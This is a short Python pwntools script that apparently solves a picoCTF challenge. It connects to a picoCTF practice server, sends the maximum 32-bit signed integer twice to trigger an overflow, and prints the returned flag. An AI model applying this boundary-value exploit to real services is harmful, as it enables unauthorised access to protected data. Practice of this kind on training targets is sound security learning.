from pwn import *

conn = "nc saturn.picoctf.net 58819"
host = conn.split(" ")[1]
port = conn.split(" ")[2]

p = remote(host, port)

num = 2**31 - 1
text = f"{num}"

p.sendline(text.encode())
p.sendline(text.encode())
f = p.recvall()
flag = f.decode().split("picoCTF")
print("picoCTF" + flag[1])
